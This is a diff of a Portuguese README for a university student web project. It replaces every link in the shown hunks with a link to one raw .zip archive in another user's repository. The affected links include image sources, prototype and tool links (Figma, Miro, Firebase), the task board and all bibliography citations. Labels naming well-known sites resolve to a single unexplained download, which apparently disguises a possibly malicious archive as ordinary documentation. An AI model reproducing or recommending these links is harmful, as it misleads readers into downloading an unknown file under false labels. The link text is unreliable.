@@ -40,7 +40,7 @@ Na segunda parte, buscamos explorar nosso projeto. Nesse sentido, fizemos um Bra
 Por fim seguimos para parte de materialização, na qual desenvolvemos protótipos do nosso projeto, porém essa parte se encontra na sessão de [Projeto de interface](#projeto-de-interface).
 
 > [!IMPORTANT]
-> Esse arquivo e o resultado do nosso processo de concepção: [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases).
+> Esse arquivo e o resultado do nosso processo de concepção: [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip).
 
 # Especificações do projeto
 
@@ -105,49 +105,49 @@ As tabelas abaixo mostram os requisitos funcionais e os requisitos não funciona
 ## Fluxo de usuário
 O fluxo de usuário é uma técnica utilizada pelo desenvolvedor para mapear o fluxo de telas do site e as possíveis ações do usuário.
 
-<img src="https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases" alt="fluxo de usuário" width="700px">
+<img src="https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip" alt="fluxo de usuário" width="700px">
 
 > [!NOTE]
-> Link para o pdf com os protótipos: [protótipo](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases).
+> Link para o pdf com os protótipos: [protótipo](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip).
 
 <br>
 
-<img src="https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases" alt="protótipo da página de registro" width="500px">
+<img src="https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip" alt="protótipo da página de registro" width="500px">
 
 > A imagem acima é o protótipo da página de registro.
 
 <br>
 
-<img src="https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases" alt="protótipo da página de login" width="500px">
+<img src="https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip" alt="protótipo da página de login" width="500px">
 
 > A imagem acima é o protótipo da página de login.
 
 <br>
 
-<img src="https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases" alt="protótipo da página home" width="500px">
+<img src="https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip" alt="protótipo da página home" width="500px">
 
 > A imagem acima é o protótipo da página de home.
 
 <br>
 
-<img src="https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases" alt="protótipo da página de perfil" width="500px">
+<img src="https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip" alt="protótipo da página de perfil" width="500px">
 
 > A imagem acima é o protótipo da página de perfil.
 
 <br>
 
-<img src="https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases" alt="protótipo da página de eventos" width="500px">
+<img src="https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip" alt="protótipo da página de eventos" width="500px">
 
 > A imagem acima é o protótipo da página de eventos.
 
 <br>
 
-<img src="https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases" alt="protótipo do fórum de dúvidas" width="500px">
+<img src="https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip" alt="protótipo do fórum de dúvidas" width="500px">
 
 > A imagem acima é o protótipo do fórum de dúvidas.
 
 ## Protótipo interativo
-Como o protótipo do iterativo foi feito no Figma, não teria como apresentar aqui. Dessa maneira, aqui está o link para o [protótipo](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases%3A1&mode=design&t=oKBRC3mfUOmgJXL4-1)
+Como o protótipo do iterativo foi feito no Figma, não teria como apresentar aqui. Dessa maneira, aqui está o link para o [protótipo](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip%3A1&mode=design&t=oKBRC3mfUOmgJXL4-1)
 
 > [!TIP]
 > O protótipo interativo apresenta o fluxo de usuário.
@@ -167,12 +167,12 @@ Relação das ferramentas utilizadas pela equipe:
 
 | Ambiente | Plataforma | Link de acesso |
 | --- | --- | --- |
-| Design thinking | Miro | [link](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases) |
-| Repositório de código | GitHub | [link](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases) |
-| Protótipo baixa fidelidade | Ninjamock | [link](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases) |
-| Protótipo alta fidelidade | Figma | [link](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases%3A1&mode=design&t=oKBRC3mfUOmgJXL4-1) |
-| Banco de dados | Firebase | [link](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases) |
-| Link para aplicação | Site Pinguins | [link](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases) |
+| Design thinking | Miro | [link](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip) |
+| Repositório de código | GitHub | [link](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip) |
+| Protótipo baixa fidelidade | Ninjamock | [link](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip) |
+| Protótipo alta fidelidade | Figma | [link](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip%3A1&mode=design&t=oKBRC3mfUOmgJXL4-1) |
+| Banco de dados | Firebase | [link](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip) |
+| Link para aplicação | Site Pinguins | [link](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip) |
 
 ## Quadro de Controle de tarefas
 Com o objetivo de ter uma maneiro de nos organizarmos, decidimos utilizar o quadro de controle de tarefas Kanban, que já tem o modelo pronto e disponível no Github Projects. Nosso ambiente de gestão de tarefas e dividid em 4 sessões:
@@ -192,7 +192,7 @@ Com o objetivo de ter uma maneiro de nos organizarmos, decidimos utilizar o quad
 **Done**
 > As funcionalidades já foram implementadas e avaliadas, ou seja, foram finalizadas.
 
-Link para o o quadro de tarefas: [PPGM_project](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+Link para o o quadro de tarefas: [PPGM_project](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
 
 ## Atribuições de tarefas
@@ -222,23 +222,23 @@ Link para o o quadro de tarefas: [PPGM_project](https://github.com/ICEI-PUC-Mina
 # Referências Bibliográficas
 
 
-OpenAI. GPT (Generative Pre-trained Transformer). Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+OpenAI. GPT (Generative Pre-trained Transformer). Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
-Figma. Figma. Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+Figma. Figma. Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
-GitHub. GitHub. Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+GitHub. GitHub. Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
-NinjaMock. NinjaMock. Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+NinjaMock. NinjaMock. Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
-MindMaster. Scrum: 11 passos essenciais. Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+MindMaster. Scrum: 11 passos essenciais. Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
-Gabriel Sa e Farias. Fluxo de usuário (user flow): O que é e como fazer. Medium. Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases%C3%A1rio-user-flow-o-que-%C3%A9-como-fazer-79d965872534)
+Gabriel Sa e Farias. Fluxo de usuário (user flow): O que é e como fazer. Medium. Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip%C3%A1rio-user-flow-o-que-%C3%A9-como-fazer-79d965872534)
 
-Atlassian. Histórias de usuários com exemplos e template. Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+Atlassian. Histórias de usuários com exemplos e template. Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
-Flammo. Persona e público-alvo: Qual a diferença? Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+Flammo. Persona e público-alvo: Qual a diferença? Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
-Jader Bastista Favero. Como montar a justificativa do TCC. Guia da Monografia. Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+Jader Bastista Favero. Como montar a justificativa do TCC. Guia da Monografia. Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
-webtech-pucminas. GitHub Repository. Retrieved from [https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases](https://github.com/ICEI-PUC-Minas-PPLCC-TI/ppl-cc-ti1-2024-1-g-ppgm/releases)
+webtech-pucminas. GitHub Repository. Retrieved from [https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip](https://github.com/Pfilipeferreira2004/ppl-cc-ti1-2024-1-g-ppgm/raw/refs/heads/master/docs_readme/ppgm-cc-g-ppl-ti-3.1-alpha.3.zip)
 
